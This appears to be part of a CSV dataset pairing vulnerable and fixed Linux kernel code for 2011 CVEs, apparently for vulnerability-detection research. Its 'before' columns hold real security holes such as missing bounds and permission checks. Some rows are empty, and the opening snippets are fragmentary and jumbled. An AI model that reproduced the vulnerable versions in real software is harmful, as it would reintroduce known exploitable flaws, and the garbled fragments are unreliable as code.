void ptrace_triggered(struct perf_event *bp,
 struct perf_sample_data *data, struct pt_regs *regs)
{
 struct perf_event_attr attr;
 die(""Weird page fault"", regs, SIGSEGV);
	}

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address);

 /* When running in the kernel we expect faults to occur only to
	 * addresses in user space.  All other faults represent errors in the
	}
 if (ret & VM_FAULT_MAJOR) {
		current->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1,
				     regs, address);
#ifdef CONFIG_PPC_SMLPAR
 if (firmware_has_feature(FW_FEATURE_CMO)) {
#endif
	} else {
		current->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1,
				     regs, address);
	}
 up_read(&mm->mmap_sem);
 goto out;

	address = trans_exc_code & __FAIL_ADDR_MASK;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address);
	flags = FAULT_FLAG_ALLOW_RETRY;
 if (access == VM_WRITE || (trans_exc_code & store_indication) == 0x400)
		flags |= FAULT_FLAG_WRITE;
 if (flags & FAULT_FLAG_ALLOW_RETRY) {
 if (fault & VM_FAULT_MAJOR) {
			tsk->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1,
				      regs, address);
		} else {
			tsk->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1,
				      regs, address);
		}
 if (fault & VM_FAULT_RETRY) {
 return 0;
}

void ptrace_triggered(struct perf_event *bp,
 struct perf_sample_data *data, struct pt_regs *regs)
{
 struct perf_event_attr attr;
 */
 if (!expected) {
 unaligned_fixups_notify(current, instruction, regs);
 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1,
			      regs, address);
	}

 return error;
	}

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1, regs, address);

	destreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1, regs, address);

	srcreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, regs, address);

	destreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, regs, address);

	srcreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 struct task_struct *tsk = current;
 struct sh_fpu_soft_struct *fpu = &(tsk->thread.xstate->softfpu);

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, regs, 0);

 if (!(task_thread_info(tsk)->status & TS_USEDFPU)) {
 /* initialize once. */
 if ((regs->sr & SR_IMASK) != SR_IMASK)
 local_irq_enable();

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address);

 /*
	 * If we're in an interrupt, have no user context or are running
	}
 if (fault & VM_FAULT_MAJOR) {
		tsk->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1,
				     regs, address);
	} else {
		tsk->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1,
				     regs, address);
	}

"
2014,#NAME?,CVE-2011-2909," /* fill devinfo structure */
	devinfo.version_code = COMEDI_VERSION_CODE;
	devinfo.n_subdevs = dev->n_subdevices;
 memcpy(devinfo.driver_name, dev->driver->driver_name, COMEDI_NAMELEN);
 memcpy(devinfo.board_name, dev->board_name, COMEDI_NAMELEN);

 if (read_subdev)
		devinfo.read_subdevice = read_subdev - dev->subdevices;
"," /* fill devinfo structure */
	devinfo.version_code = COMEDI_VERSION_CODE;
	devinfo.n_subdevs = dev->n_subdevices;
 strlcpy(devinfo.driver_name, dev->driver->driver_name, COMEDI_NAMELEN);
 strlcpy(devinfo.board_name, dev->board_name, COMEDI_NAMELEN);

 if (read_subdev)
		devinfo.read_subdevice = read_subdev - dev->subdevices;
"
2012,DoS Mem. Corr. ,CVE-2011-2906," pmcraid_err(""couldn't build passthrough ioadls\n"");
 goto out_free_buffer;
		}



	}

 /* If data is being written into the device, copy the data from user
"," pmcraid_err(""couldn't build passthrough ioadls\n"");
 goto out_free_buffer;
		}
	} else if (request_size < 0) {
		rc = -EINVAL;
 goto out_free_buffer;
	}

 /* If data is being written into the device, copy the data from user
"
2013,,CVE-2011-2905,"int perf_config(config_fn_t fn, void *data)
{
 int ret = 0, found = 0;
 char *repo_config = NULL;
 const char *home = NULL;

 /* Setting $PERF_CONFIG makes perf read _only_ the given config file. */
 free(user_config);
	}

	repo_config = perf_pathdup(""config"");
 if (!access(repo_config, R_OK)) {
		ret += perf_config_from_file(fn, repo_config, data);
		found += 1;
	}
 free(repo_config);
 if (found == 0)
 return -1;
 return ret;
","int perf_config(config_fn_t fn, void *data)
{
 int ret = 0, found = 0;

 const char *home = NULL;

 /* Setting $PERF_CONFIG makes perf read _only_ the given config file. */
 free(user_config);
	}







 if (found == 0)
 return -1;
 return ret;
"
2012,#NAME?,CVE-2011-2898,"	__u16		tp_mac;
	__u16		tp_net;
	__u16		tp_vlan_tci;

};

/* Rx ring - header status */
	__u32		tp_sec;
	__u32		tp_nsec;
	__u16		tp_vlan_tci;

};

#define TPACKET2_HDRLEN		(TPACKET_ALIGN(sizeof(struct tpacket2_hdr)) + sizeof(struct sockaddr_ll))
		} else {
			h.h2->tp_vlan_tci = 0;
		}

		hdrlen = sizeof(*h.h2);
 break;
 default:
		} else {
			aux.tp_vlan_tci = 0;
		}

 put_cmsg(msg, SOL_PACKET, PACKET_AUXDATA, sizeof(aux), &aux);
	}

","	__u16		tp_mac;
	__u16		tp_net;
	__u16		tp_vlan_tci;
	__u16		tp_padding;
};

/* Rx ring - header status */
	__u32		tp_sec;
	__u32		tp_nsec;
	__u16		tp_vlan_tci;
	__u16		tp_padding;
};

#define TPACKET2_HDRLEN		(TPACKET_ALIGN(sizeof(struct tpacket2_hdr)) + sizeof(struct sockaddr_ll))
		} else {
			h.h2->tp_vlan_tci = 0;
		}
		h.h2->tp_padding = 0;
		hdrlen = sizeof(*h.h2);
 break;
 default:
		} else {
			aux.tp_vlan_tci = 0;
		}
		aux.tp_padding = 0;
 put_cmsg(msg, SOL_PACKET, PACKET_AUXDATA, sizeof(aux), &aux);
	}

"
2011,DoS ,CVE-2011-2723,,
2012,#NAME?,CVE-2011-2707," elf_xtregs_t *xtregs = uregs;
 int ret = 0;




#if XTENSA_HAVE_COPROCESSORS
 /* Flush all coprocessors before we overwrite them. */
 coprocessor_flush_all(ti);
"," elf_xtregs_t *xtregs = uregs;
 int ret = 0;

 if (!access_ok(VERIFY_READ, uregs, sizeof(elf_xtregs_t)))
 return -EFAULT;

#if XTENSA_HAVE_COPROCESSORS
 /* Flush all coprocessors before we overwrite them. */
 coprocessor_flush_all(ti);
"
2011,DoS Overflow ,CVE-2011-2700,,
2012,DoS ,CVE-2011-2699," return half_md4_transform(hash, keyptr->secret);
}
















#ifdef CONFIG_INET

__u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr,
void generate_random_uuid(unsigned char uuid_out[16]);

extern __u32 secure_ip_id(__be32 daddr);

extern u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport);
extern u32 secure_ipv6_port_ephemeral(const __be32 *saddr, const __be32 *daddr,
				      __be16 dport);
}

/* can be called with or without local BH being disabled */
struct inet_peer	*inet_getpeer(struct inetpeer_addr *daddr, int create);

static inline struct inet_peer *inet_getpeer_v4(__be32 v4daddr, int create)
{


/* can be called with or without local BH being disabled */
static inline __u16	inet_getid(struct inet_peer *p, int more)
{

	more++;
 inet_peer_refcheck(p);
 return atomic_add_return(more, &p->ip_id_count) - more;






}

#endif /* _NET_INETPEER_H */
 return __ipv6_addr_diff(a1, a2, sizeof(struct in6_addr));
}

static __inline__ void ipv6_select_ident(struct frag_hdr *fhdr)
{
 static u32 ipv6_fragmentation_id = 1;
 static DEFINE_SPINLOCK(ip6_id_lock);

 spin_lock_bh(&ip6_id_lock);
	fhdr->identification = htonl(ipv6_fragmentation_id);
 if (++ipv6_fragmentation_id == 0)
		ipv6_fragmentation_id = 1;
 spin_unlock_bh(&ip6_id_lock);
}

/*
 *	Prototypes exported by ipv6
 return cnt;
}

struct inet_peer *inet_getpeer(struct inetpeer_addr *daddr, int create)
{
 struct inet_peer __rcu **stack[PEER_MAXDEPTH], ***stackptr;
 struct inet_peer_base *base = family_to_base(daddr->family);
		p->daddr = *daddr;
 atomic_set(&p->refcnt, 1);
 atomic_set(&p->rid, 0);
 atomic_set(&p->ip_id_count, secure_ip_id(daddr->addr.a4));



		p->tcp_ts_stamp = 0;
		p->metrics[RTAX_LOCK-1] = INETPEER_METRICS_NEW;
		p->rate_tokens = 0;
 return offset;
}


























int ip6_fragment(struct sk_buff *skb, int (*output)(struct sk_buff *))
{
 struct sk_buff *frag;
 skb_reset_network_header(skb);
 memcpy(skb_network_header(skb), tmp_hdr, hlen);

 ipv6_select_ident(fh);
		fh->nexthdr = nexthdr;
		fh->reserved = 0;
		fh->frag_off = htons(IP6_MF);
		fh->nexthdr = nexthdr;
		fh->reserved = 0;
 if (!frag_id) {
 ipv6_select_ident(fh);
			frag_id = fh->identification;
		} else
			fh->identification = frag_id;
 int getfrag(void *from, char *to, int offset, int len,
 int odd, struct sk_buff *skb),
			void *from, int length, int hh_len, int fragheaderlen,
			int transhdrlen, int mtu,unsigned int flags)


{
 struct sk_buff *skb;
 skb_shinfo(skb)->gso_size = (mtu - fragheaderlen -
 sizeof(struct frag_hdr)) & ~7;
 skb_shinfo(skb)->gso_type = SKB_GSO_UDP;
 ipv6_select_ident(&fhdr);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;
 __skb_queue_tail(&sk->sk_write_queue, skb);


			err = ip6_ufo_append_data(sk, getfrag, from, length,
						  hh_len, fragheaderlen,
						  transhdrlen, mtu, flags);
 if (err)
 goto error;
 return 0;
	fptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);
	fptr->nexthdr = nexthdr;
	fptr->reserved = 0;
 ipv6_select_ident(fptr);

 /* Fragment the skb. ipv6 header and the remaining fields of the
	 * fragment header are updated in ipv6_gso_segment()
"," return half_md4_transform(hash, keyptr->secret);
}

__u32 secure_ipv6_id(const __be32 daddr[4])
{
 const struct keydata *keyptr;
	__u32 hash[4];

	keyptr = get_keyptr();

	hash[0] = (__force __u32)daddr[0];
	hash[1] = (__force __u32)daddr[1];
	hash[2] = (__force __u32)daddr[2];
	hash[3] = (__force __u32)daddr[3];

 return half_md4_transform(hash, keyptr->secret);
}

#ifdef CONFIG_INET

__u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr,
void generate_random_uuid(unsigned char uuid_out[16]);

extern __u32 secure_ip_id(__be32 daddr);
extern __u32 secure_ipv6_id(const __be32 daddr[4]);
extern u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport);
extern u32 secure_ipv6_port_ephemeral(const __be32 *saddr, const __be32 *daddr,
				      __be16 dport);
}

/* can be called with or without local BH being disabled */
struct inet_peer	*inet_getpeer(const struct inetpeer_addr *daddr, int create);

static inline struct inet_peer *inet_getpeer_v4(__be32 v4daddr, int create)
{


/* can be called with or without local BH being disabled */
static inline int inet_getid(struct inet_peer *p, int more)
{
 int old, new;
	more++;
 inet_peer_refcheck(p);
 do {
		old = atomic_read(&p->ip_id_count);
		new = old + more;
 if (!new)
			new = 1;
	} while (atomic_cmpxchg(&p->ip_id_count, old, new) != old);
 return new;
}

#endif /* _NET_INETPEER_H */
 return __ipv6_addr_diff(a1, a2, sizeof(struct in6_addr));
}

extern void ipv6_select_ident(struct frag_hdr *fhdr, struct rt6_info *rt);











/*
 *	Prototypes exported by ipv6
 return cnt;
}

struct inet_peer *inet_getpeer(const struct inetpeer_addr *daddr, int create)
{
 struct inet_peer __rcu **stack[PEER_MAXDEPTH], ***stackptr;
 struct inet_peer_base *base = family_to_base(daddr->family);
		p->daddr = *daddr;
 atomic_set(&p->refcnt, 1);
 atomic_set(&p->rid, 0);
 atomic_set(&p->ip_id_count,
				(daddr->family == AF_INET) ?
 secure_ip_id(daddr->addr.a4) :
 secure_ipv6_id(daddr->addr.a6));
		p->tcp_ts_stamp = 0;
		p->metrics[RTAX_LOCK-1] = INETPEER_METRICS_NEW;
		p->rate_tokens = 0;
 return offset;
}

void ipv6_select_ident(struct frag_hdr *fhdr, struct rt6_info *rt)
{
 static atomic_t ipv6_fragmentation_id;
 int old, new;

 if (rt) {
 struct inet_peer *peer;

 if (!rt->rt6i_peer)
 rt6_bind_peer(rt, 1);
		peer = rt->rt6i_peer;
 if (peer) {
			fhdr->identification = htonl(inet_getid(peer, 0));
 return;
		}
	}
 do {
		old = atomic_read(&ipv6_fragmentation_id);
		new = old + 1;
 if (!new)
			new = 1;
	} while (atomic_cmpxchg(&ipv6_fragmentation_id, old, new) != old);
	fhdr->identification = htonl(new);
}

int ip6_fragment(struct sk_buff *skb, int (*output)(struct sk_buff *))
{
 struct sk_buff *frag;
 skb_reset_network_header(skb);
 memcpy(skb_network_header(skb), tmp_hdr, hlen);

 ipv6_select_ident(fh, rt);
		fh->nexthdr = nexthdr;
		fh->reserved = 0;
		fh->frag_off = htons(IP6_MF);
		fh->nexthdr = nexthdr;
		fh->reserved = 0;
 if (!frag_id) {
 ipv6_select_ident(fh, rt);
			frag_id = fh->identification;
		} else
			fh->identification = frag_id;
 int getfrag(void *from, char *to, int offset, int len,
 int odd, struct sk_buff *skb),
			void *from, int length, int hh_len, int fragheaderlen,
			int transhdrlen, int mtu,unsigned int flags,
			struct rt6_info *rt)

{
 struct sk_buff *skb;
 skb_shinfo(skb)->gso_size = (mtu - fragheaderlen -
 sizeof(struct frag_hdr)) & ~7;
 skb_shinfo(skb)->gso_type = SKB_GSO_UDP;
 ipv6_select_ident(&fhdr, rt);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;
 __skb_queue_tail(&sk->sk_write_queue, skb);


			err = ip6_ufo_append_data(sk, getfrag, from, length,
						  hh_len, fragheaderlen,
						  transhdrlen, mtu, flags, rt);
 if (err)
 goto error;
 return 0;
	fptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);
	fptr->nexthdr = nexthdr;
	fptr->reserved = 0;
 ipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));

 /* Fragment the skb. ipv6 header and the remaining fields of the
	 * fragment header are updated in ipv6_gso_segment()
"
2011,DoS ,CVE-2011-2695,,
2011,DoS ,CVE-2011-2689,,
2011,DoS Overflow ,CVE-2011-2534,,
2012,DoS ,CVE-2011-2525,,
2012,DoS ,CVE-2011-2521,"		hwc->event_base	= 0;
	} else if (hwc->idx >= X86_PMC_IDX_FIXED) {
		hwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;
		hwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0;
	} else {
		hwc->config_base = x86_pmu_config_addr(hwc->idx);
		hwc->event_base  = x86_pmu_event_addr(hwc->idx);
","		hwc->event_base	= 0;
	} else if (hwc->idx >= X86_PMC_IDX_FIXED) {
		hwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;
		hwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0 + (hwc->idx - X86_PMC_IDX_FIXED);
	} else {
		hwc->config_base = x86_pmu_config_addr(hwc->idx);
		hwc->event_base  = x86_pmu_event_addr(hwc->idx);
"
2012,DoS ,CVE-2011-2518,"	}
 if (need_dev) {
 /* Get mount point or device file. */
 if (kern_path(dev_name, LOOKUP_FOLLOW, &path)) {
			error = -ENOENT;
 goto out;
		}
","	}
 if (need_dev) {
 /* Get mount point or device file. */
 if (!dev_name || kern_path(dev_name, LOOKUP_FOLLOW, &path)) {
			error = -ENOENT;
 goto out;
		}
"
2012,Overflow +Priv ,CVE-2011-2517,"	i = 0;
 if (info->attrs[NL80211_ATTR_SCAN_SSIDS]) {
 nla_for_each_nested(attr, info->attrs[NL80211_ATTR_SCAN_SSIDS], tmp) {

 if (request->ssids[i].ssid_len > IEEE80211_MAX_SSID_LEN) {
				err = -EINVAL;
 goto out_free;
			}
 memcpy(request->ssids[i].ssid, nla_data(attr), nla_len(attr));
			request->ssids[i].ssid_len = nla_len(attr);
			i++;
		}
	}
 if (info->attrs[NL80211_ATTR_SCAN_SSIDS]) {
 nla_for_each_nested(attr, info->attrs[NL80211_ATTR_SCAN_SSIDS],
				    tmp) {

 if (request->ssids[i].ssid_len >
			    IEEE80211_MAX_SSID_LEN) {
				err = -EINVAL;
 goto out_free;
			}
 memcpy(request->ssids[i].ssid, nla_data(attr),
 nla_len(attr));
			request->ssids[i].ssid_len = nla_len(attr);
			i++;
		}
	}
","	i = 0;
 if (info->attrs[NL80211_ATTR_SCAN_SSIDS]) {
 nla_for_each_nested(attr, info->attrs[NL80211_ATTR_SCAN_SSIDS], tmp) {
			request->ssids[i].ssid_len = nla_len(attr);
 if (request->ssids[i].ssid_len > IEEE80211_MAX_SSID_LEN) {
				err = -EINVAL;
 goto out_free;
			}
 memcpy(request->ssids[i].ssid, nla_data(attr), nla_len(attr));

			i++;
		}
	}
 if (info->attrs[NL80211_ATTR_SCAN_SSIDS]) {
 nla_for_each_nested(attr, info->attrs[NL80211_ATTR_SCAN_SSIDS],
				    tmp) {
			request->ssids[i].ssid_len = nla_len(attr);
 if (request->ssids[i].ssid_len >
			    IEEE80211_MAX_SSID_LEN) {
				err = -EINVAL;
 goto out_free;
			}
 memcpy(request->ssids[i].ssid, nla_data(attr),
 nla_len(attr));

			i++;
		}
	}
"
2020,DoS ,CVE-2011-2498,,
2011,DoS Overflow Mem. Corr. ,CVE-2011-2497,,
2012,DoS Overflow ,CVE-2011-2496," if (old_len > vma->vm_end - addr)
 goto Efault;

 if (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {
 if (new_len > old_len)



 goto Efault;




	}

 if (vma->vm_flags & VM_LOCKED) {
"," if (old_len > vma->vm_end - addr)
 goto Efault;

 /* Need to be careful about a growing mapping */
 if (new_len > old_len) {
 unsigned long pgoff;

 if (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))
 goto Efault;
		pgoff = (addr - vma->vm_start) >> PAGE_SHIFT;
		pgoff += vma->vm_pgoff;
 if (pgoff + (new_len >> PAGE_SHIFT) < pgoff)
 goto Einval;
	}

 if (vma->vm_flags & VM_LOCKED) {
"
2012,,CVE-2011-2495," struct task_io_accounting acct = task->ioac;
 unsigned long flags;




 if (whole && lock_task_sighand(task, &flags)) {
 struct task_struct *t = task;

 REG(""coredump_filter"", S_IRUGO|S_IWUSR, proc_coredump_filter_operations),
#endif
#ifdef CONFIG_TASK_IO_ACCOUNTING
 INF(""io"",	S_IRUGO, proc_tgid_io_accounting),
#endif
#ifdef CONFIG_HARDWALL
 INF(""hardwall"",   S_IRUGO, proc_pid_hardwall),
 REG(""make-it-fail"", S_IRUGO|S_IWUSR, proc_fault_inject_operations),
#endif
#ifdef CONFIG_TASK_IO_ACCOUNTING
 INF(""io"",	S_IRUGO, proc_tid_io_accounting),
#endif
#ifdef CONFIG_HARDWALL
 INF(""hardwall"",   S_IRUGO, proc_pid_hardwall),
"," struct task_io_accounting acct = task->ioac;
 unsigned long flags;

 if (!ptrace_may_access(task, PTRACE_MODE_READ))
 return -EACCES;

 if (whole && lock_task_sighand(task, &flags)) {
 struct task_struct *t = task;

 REG(""coredump_filter"", S_IRUGO|S_IWUSR, proc_coredump_filter_operations),
#endif
#ifdef CONFIG_TASK_IO_ACCOUNTING
 INF(""io"",	S_IRUSR, proc_tgid_io_accounting),
#endif
#ifdef CONFIG_HARDWALL
 INF(""hardwall"",   S_IRUGO, proc_pid_hardwall),
 REG(""make-it-fail"", S_IRUGO|S_IWUSR, proc_fault_inject_operations),
#endif
#ifdef CONFIG_TASK_IO_ACCOUNTING
 INF(""io"",	S_IRUSR, proc_tid_io_accounting),
#endif
#ifdef CONFIG_HARDWALL
 INF(""hardwall"",   S_IRUGO, proc_pid_hardwall),
"
2012,#NAME?,CVE-2011-2494,"	.cmd		= TASKSTATS_CMD_GET,
	.doit		= taskstats_user_cmd,
	.policy		= taskstats_cmd_get_policy,

};

static struct genl_ops cgroupstats_ops = {
","	.cmd		= TASKSTATS_CMD_GET,
	.doit		= taskstats_user_cmd,
	.policy		= taskstats_cmd_get_policy,
	.flags		= GENL_ADMIN_PERM,
};

static struct genl_ops cgroupstats_ops = {
"
2012,DoS ,CVE-2011-2493," get_random_bytes(&sbi->s_next_generation, sizeof(u32));
 spin_lock_init(&sbi->s_next_gen_lock);





	err = percpu_counter_init(&sbi->s_freeblocks_counter,
 ext4_count_free_blocks(sb));
 if (!err) {
 ""Opts: %s%s%s"", descr, sbi->s_es->s_mount_opts,
		 *sbi->s_es->s_mount_opts ? ""; "" : """", orig_data);

 init_timer(&sbi->s_err_report);
	sbi->s_err_report.function = print_daily_error_info;
	sbi->s_err_report.data = (unsigned long) sb;
 if (es->s_error_count)
 mod_timer(&sbi->s_err_report, jiffies + 300*HZ); /* 5 minutes */

		sbi->s_journal = NULL;
	}
failed_mount3:

 if (sbi->s_flex_groups) {
 if (is_vmalloc_addr(sbi->s_flex_groups))
 vfree(sbi->s_flex_groups);
"," get_random_bytes(&sbi->s_next_generation, sizeof(u32));
 spin_lock_init(&sbi->s_next_gen_lock);

 init_timer(&sbi->s_err_report);
	sbi->s_err_report.function = print_daily_error_info;
	sbi->s_err_report.data = (unsigned long) sb;

	err = percpu_counter_init(&sbi->s_freeblocks_counter,
 ext4_count_free_blocks(sb));
 if (!err) {
 ""Opts: %s%s%s"", descr, sbi->s_es->s_mount_opts,
		 *sbi->s_es->s_mount_opts ? ""; "" : """", orig_data);




 if (es->s_error_count)
 mod_timer(&sbi->s_err_report, jiffies + 300*HZ); /* 5 minutes */

		sbi->s_journal = NULL;
	}
failed_mount3:
 del_timer(&sbi->s_err_report);
 if (sbi->s_flex_groups) {
 if (is_vmalloc_addr(sbi->s_flex_groups))
 vfree(sbi->s_flex_groups);
"
2011,#NAME?,CVE-2011-2492,,
2013,DoS ,CVE-2011-2491,"
 if (task->tk_status < 0) {
 dprintk(""lockd: unlock failed (err = %d)\n"", -task->tk_status);
 goto retry_rebind;






	}
 if (status == NLM_LCK_DENIED_GRACE_PERIOD) {
 rpc_delay(task, NLMCLNT_GRACE_WAIT);
#endif
 unsigned char		tk_priority : 2,/* Task priority */
				tk_garb_retry : 2,
				tk_cred_retry : 2;

};
#define tk_xprt			tk_client->cl_xprt

			status = -EOPNOTSUPP;
 break;
		}



 rpc_delay(task, 3*HZ);
 goto retry_timeout;
 case -ETIMEDOUT:
 /* Initialize retry counters */
	task->tk_garb_retry = 2;
	task->tk_cred_retry = 2;


	task->tk_priority = task_setup_data->priority - RPC_PRIORITY_LOW;
	task->tk_owner = current->tgid;
","
 if (task->tk_status < 0) {
 dprintk(""lockd: unlock failed (err = %d)\n"", -task->tk_status);
 switch (task->tk_status) {
 case -EACCES:
 case -EIO:
 goto die;
 default:
 goto retry_rebind;
		}
	}
 if (status == NLM_LCK_DENIED_GRACE_PERIOD) {
 rpc_delay(task, NLMCLNT_GRACE_WAIT);
#endif
 unsigned char		tk_priority : 2,/* Task priority */
				tk_garb_retry : 2,
				tk_cred_retry : 2,
				tk_rebind_retry : 2;
};
#define tk_xprt			tk_client->cl_xprt

			status = -EOPNOTSUPP;
 break;
		}
 if (task->tk_rebind_retry == 0)
 break;
		task->tk_rebind_retry--;
 rpc_delay(task, 3*HZ);
 goto retry_timeout;
 case -ETIMEDOUT:
 /* Initialize retry counters */
	task->tk_garb_retry = 2;
	task->tk_cred_retry = 2;
	task->tk_rebind_retry = 2;

	task->tk_priority = task_setup_data->priority - RPC_PRIORITY_LOW;
	task->tk_owner = current->tgid;
"
2011,DoS Bypass ,CVE-2011-2484,,
2013,DoS ,CVE-2011-2482," finish_wait(sk->sk_sleep, &wait);
}































/* Populate the fields of the newsk from the oldsk and migrate the assoc
 * and its messages to the newsk.
 */
 sctp_skb_for_each(skb, &oldsk->sk_receive_queue, tmp) {
		event = sctp_skb2event(skb);
 if (event->asoc == assoc) {
 sctp_sock_rfree(skb);
 __skb_unlink(skb, &oldsk->sk_receive_queue);
 __skb_queue_tail(&newsk->sk_receive_queue, skb);
 sctp_skb_set_owner_r(skb, newsk);
		}
	}

 sctp_skb_for_each(skb, &oldsp->pd_lobby, tmp) {
			event = sctp_skb2event(skb);
 if (event->asoc == assoc) {
 sctp_sock_rfree(skb);
 __skb_unlink(skb, &oldsp->pd_lobby);
 __skb_queue_tail(queue, skb);
 sctp_skb_set_owner_r(skb, newsk);
			}
		}


	}











 /* Set the type of socket to indicate that it is peeled off from the
	 * original UDP-style socket or created with the accept() call on a
	 * TCP-style socket..
"," finish_wait(sk->sk_sleep, &wait);
}

static void sctp_sock_rfree_frag(struct sk_buff *skb)
{
 struct sk_buff *frag;

 if (!skb->data_len)
 goto done;

 /* Don't forget the fragments. */
 for (frag = skb_shinfo(skb)->frag_list; frag; frag = frag->next)
 sctp_sock_rfree_frag(frag);

done:
 sctp_sock_rfree(skb);
}

static void sctp_skb_set_owner_r_frag(struct sk_buff *skb, struct sock *sk)
{
 struct sk_buff *frag;

 if (!skb->data_len)
 goto done;

 /* Don't forget the fragments. */
 for (frag = skb_shinfo(skb)->frag_list; frag; frag = frag->next)
 sctp_skb_set_owner_r_frag(frag, sk);

done:
 sctp_skb_set_owner_r(skb, sk);
}

/* Populate the fields of the newsk from the oldsk and migrate the assoc
 * and its messages to the newsk.
 */
 sctp_skb_for_each(skb, &oldsk->sk_receive_queue, tmp) {
		event = sctp_skb2event(skb);
 if (event->asoc == assoc) {
 sctp_sock_rfree_frag(skb);
 __skb_unlink(skb, &oldsk->sk_receive_queue);
 __skb_queue_tail(&newsk->sk_receive_queue, skb);
 sctp_skb_set_owner_r_frag(skb, newsk);
		}
	}

 sctp_skb_for_each(skb, &oldsp->pd_lobby, tmp) {
			event = sctp_skb2event(skb);
 if (event->asoc == assoc) {
 sctp_sock_rfree_frag(skb);
 __skb_unlink(skb, &oldsp->pd_lobby);
 __skb_queue_tail(queue, skb);
 sctp_skb_set_owner_r_frag(skb, newsk);
			}
		}


	}

 sctp_skb_for_each(skb, &assoc->ulpq.reasm, tmp) {
 sctp_sock_rfree_frag(skb);
 sctp_skb_set_owner_r_frag(skb, newsk);
	}

 sctp_skb_for_each(skb, &assoc->ulpq.lobby, tmp) {
 sctp_sock_rfree_frag(skb);
 sctp_skb_set_owner_r_frag(skb, newsk);
	}

 /* Set the type of socket to indicate that it is peeled off from the
	 * original UDP-style socket or created with the accept() call on a
	 * TCP-style socket..
"
2013,DoS ,CVE-2011-2479," unsigned long end,
 long adjust_next)
{
 if (!vma->anon_vma || vma->vm_ops || vma->vm_file)
 return;
 __vma_adjust_trans_huge(vma, start, end, adjust_next);
}
#define VM_RandomReadHint(v)		((v)->vm_flags & VM_RAND_READ)

/*
 * special vmas that are non-mergable, non-mlock()able

 */
#define VM_SPECIAL (VM_IO | VM_DONTEXPAND | VM_RESERVED | VM_PFNMAP)

 return ret;
}




int hugepage_madvise(struct vm_area_struct *vma,
 unsigned long *vm_flags, int advice)
{
 /*
		 * Be somewhat over-protective like KSM for now!
 */
 if (*vm_flags & (VM_HUGEPAGE |
				 VM_SHARED   | VM_MAYSHARE   |
				 VM_PFNMAP   | VM_IO      | VM_DONTEXPAND |
				 VM_RESERVED | VM_HUGETLB | VM_INSERTPAGE |
				 VM_MIXEDMAP | VM_SAO))
 return -EINVAL;
		*vm_flags &= ~VM_NOHUGEPAGE;
		*vm_flags |= VM_HUGEPAGE;
 /*
		 * Be somewhat over-protective like KSM for now!
 */
 if (*vm_flags & (VM_NOHUGEPAGE |
				 VM_SHARED   | VM_MAYSHARE   |
				 VM_PFNMAP   | VM_IO      | VM_DONTEXPAND |
				 VM_RESERVED | VM_HUGETLB | VM_INSERTPAGE |
				 VM_MIXEDMAP | VM_SAO))
 return -EINVAL;
		*vm_flags &= ~VM_HUGEPAGE;
		*vm_flags |= VM_NOHUGEPAGE;
		 * page fault if needed.
 */
 return 0;
 if (vma->vm_file || vma->vm_ops)
 /* khugepaged not yet working on file or special mappings */
 return 0;
 VM_BUG_ON(is_linear_pfn_mapping(vma) || is_pfn_mapping(vma));




	hstart = (vma->vm_start + ~HPAGE_PMD_MASK) & HPAGE_PMD_MASK;
	hend = vma->vm_end & HPAGE_PMD_MASK;
 if (hstart < hend)
	    (vma->vm_flags & VM_NOHUGEPAGE))
 goto out;

 /* VM_PFNMAP vmas may have vm_ops null but vm_file set */
 if (!vma->anon_vma || vma->vm_ops || vma->vm_file)
 goto out;
 if (is_vma_temporary_stack(vma))
 goto out;
 VM_BUG_ON(is_linear_pfn_mapping(vma) || is_pfn_mapping(vma));





	pgd = pgd_offset(mm, address);
 if (!pgd_present(*pgd))
			progress++;
 continue;
		}
 /* VM_PFNMAP vmas may have vm_ops null but vm_file set */
 if (!vma->anon_vma || vma->vm_ops || vma->vm_file)
 goto skip;
 if (is_vma_temporary_stack(vma))
 goto skip;

 VM_BUG_ON(is_linear_pfn_mapping(vma) || is_pfn_mapping(vma));





		hstart = (vma->vm_start + ~HPAGE_PMD_MASK) & HPAGE_PMD_MASK;
		hend = vma->vm_end & HPAGE_PMD_MASK;
"," unsigned long end,
 long adjust_next)
{
 if (!vma->anon_vma || vma->vm_ops)
 return;
 __vma_adjust_trans_huge(vma, start, end, adjust_next);
}
#define VM_RandomReadHint(v)		((v)->vm_flags & VM_RAND_READ)

/*
